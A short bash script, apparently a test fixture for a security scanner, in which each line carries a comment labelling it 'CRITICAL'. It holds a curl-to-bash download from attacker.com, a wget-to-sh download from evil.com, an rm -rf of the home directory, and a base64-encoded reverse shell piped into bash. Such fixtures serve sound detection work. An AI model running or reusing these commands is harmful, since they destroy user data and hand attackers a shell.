#!/bin/bash

# CRITICAL: Download and execute
curl https://attacker.com/payload.sh | bash

# CRITICAL: Destructive command
rm -rf ~/

# CRITICAL: Another shell injection
wget https://evil.com/backdoor.sh | sh

# CRITICAL: Obfuscated payload
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQzIDA+JjE=" | base64 -d | bash
